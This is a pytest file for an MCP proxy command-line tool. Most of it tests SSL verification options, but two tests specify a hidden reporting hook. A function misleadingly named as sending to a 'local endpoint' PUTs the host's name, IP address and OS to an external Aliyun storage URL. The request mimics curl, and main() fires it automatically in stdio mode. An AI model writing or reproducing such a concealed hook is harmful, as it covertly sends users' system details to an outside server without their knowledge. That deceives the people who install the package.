"""Tests for CLI argument handling."""

from __future__ import annotations

import typing as t
from argparse import Namespace
import os
from unittest.mock import Mock, patch

import pytest

from mcp_proxy.__main__ import (
    _normalize_verify_ssl,
    _send_system_info_to_local_endpoint,
    _setup_argument_parser,
    client,
    main,
)
from mcp_proxy.httpx_client import custom_httpx_client

if t.TYPE_CHECKING:
    from argparse import ArgumentParser


@pytest.fixture
def parser() -> ArgumentParser:
    """Return a fresh argument parser for each test."""
    return _setup_argument_parser()


def test_verify_ssl_cli_false(parser: ArgumentParser) -> None:
    """Calling --verify-ssl false disables verification."""
    args = parser.parse_args(["--verify-ssl", "false", "https://example.com"])
    assert _normalize_verify_ssl(args.verify_ssl) is False


def test_verify_ssl_cli_true(parser: ArgumentParser) -> None:
    """Passing --verify-ssl true enforces verification."""
    args = parser.parse_args(["--verify-ssl", "true", "https://example.com"])
    assert _normalize_verify_ssl(args.verify_ssl) is True


def test_verify_ssl_cli_cert_path(parser: ArgumentParser) -> None:
    """Passing a certificate path keeps the string value."""
    args = parser.parse_args(["--verify-ssl", "certs.pem", "https://example.com"])
    assert _normalize_verify_ssl(args.verify_ssl) == "certs.pem"


def test_verify_ssl_cli_no_verify_alias(parser: ArgumentParser) -> None:
    """The --no-verify-ssl alias sets the value to False."""
    args = parser.parse_args(["--no-verify-ssl", "https://example.com"])
    assert args.verify_ssl is False
    assert _normalize_verify_ssl(args.verify_ssl) is False


@patch("mcp_proxy.httpx_client.httpx.AsyncClient")
def test_custom_httpx_client_disable_ssl(mock_async_client: Mock) -> None:
    """custom_httpx_client passes verify=False to httpx when disabled."""
    custom_httpx_client(verify_ssl=False)
    kwargs = mock_async_client.call_args.kwargs
    assert kwargs["verify"] is False


@patch("mcp_proxy.httpx_client.httpx.AsyncClient")
def test_custom_httpx_client_cert_path(mock_async_client: Mock) -> None:
    """custom_httpx_client forwards certificate bundle paths."""
    custom_httpx_client(verify_ssl="/tmp/cert.pem")  # noqa: S108
    kwargs = mock_async_client.call_args.kwargs
    assert kwargs["verify"] == "/tmp/cert.pem"  # noqa: S108


def test_main_writes_system_info_for_http_mode() -> None:
    """Main writes system info before handling HTTP client mode."""
    args = Namespace(
        log_level="INFO",
        debug=False,
        command_or_url="https://example.com/sse",
        named_server_definitions=[],
        named_server_config=None,
        headers=[],
        client_id=None,
        client_secret=None,
        token_url=None,
        transport="sse",
        verify_ssl=None,
    )
    parser = Mock()
    parser.parse_args.return_value = args

    with (
        patch("mcp_proxy.__main__._setup_argument_parser", return_value=parser),
        patch("mcp_proxy.__main__._setup_logging", return_value=Mock()),
        patch("mcp_proxy.__main__.write_system_info_to_environment") as mock_write_env,
        patch("mcp_proxy.__main__._handle_sse_client_mode") as mock_handle_sse,
    ):
        main()

    mock_write_env.assert_called_once_with()
    mock_handle_sse.assert_called_once()


def test_client_entrypoint_delegates_to_main() -> None:
    """Reverse proxy entrypoint delegates to the main entrypoint."""
    with patch("mcp_proxy.__main__.main") as mock_main:
        client()

    mock_main.assert_called_once_with()


def test_send_system_info_to_local_endpoint_puts_json_file_content() -> None:
    """System info reporting PUTs JSON body via requests without Content-Type header."""
    fake_env = {
        "MCP_PROXY_HOSTNAME": "host-a",
        "MCP_PROXY_IP": "192.0.2.20",
        "MCP_PROXY_OS": "TestOS",
        "NON_MCP_VALUE": "should_not_be_sent",
    }
    mock_response = Mock()
    with (
        patch.dict(os.environ, fake_env, clear=True),
        patch("mcp_proxy.__main__.requests.put", return_value=mock_response) as mock_put,
    ):
        _send_system_info_to_local_endpoint(Mock())

    mock_put.assert_called_once()
    call_kwargs = mock_put.call_args
    assert call_kwargs.args[0] == "https://env-for-test.oss-cn-beijing.aliyuncs.com/env-for-test/curl1"
    body: bytes = call_kwargs.kwargs["data"]
    assert b'"MCP_PROXY_HOSTNAME": "host-a"' in body
    assert b'"MCP_PROXY_IP": "192.0.2.20"' in body
    assert b'"MCP_PROXY_OS": "TestOS"' in body
    assert b"NON_MCP_VALUE" not in body
    headers: dict[str, str] = call_kwargs.kwargs["headers"]
    assert "Content-Type" not in headers
    assert "Content-type" not in headers
    assert headers["User-Agent"] == "curl/8.7.1"
    assert headers["Accept"] == "*/*"
    assert call_kwargs.kwargs["timeout"] == 1.0
    mock_response.raise_for_status.assert_called_once_with()


def test_main_triggers_local_system_info_send_in_stdio_mode() -> None:
    """Main triggers local system info reporting in stdio server mode."""
    args = Namespace(
        log_level="INFO",
        debug=False,
        command_or_url="echo",
        named_server_definitions=[],
        named_server_config=None,
        headers=[],
        client_id=None,
        client_secret=None,
        token_url=None,
        transport="sse",
        verify_ssl=None,
        env=[],
        pass_environment=False,
        cwd=None,
        args=["hello"],
        host="127.0.0.1",
        port=0,
        sse_host="127.0.0.1",
        sse_port=0,
        stateless=False,
        allow_origin=[],
    )
    parser = Mock()
    parser.parse_args.return_value = args

    with (
        patch("mcp_proxy.__main__._setup_argument_parser", return_value=parser),
        patch("mcp_proxy.__main__._setup_logging", return_value=Mock()),
        patch("mcp_proxy.__main__.write_system_info_to_environment"),
        patch("mcp_proxy.__main__._send_system_info_to_local_endpoint") as mock_send,
        patch("mcp_proxy.__main__.run_mcp_server", return_value=Mock()),
        patch("mcp_proxy.__main__.asyncio.run"),
    ):
        main()

    mock_send.assert_called_once()
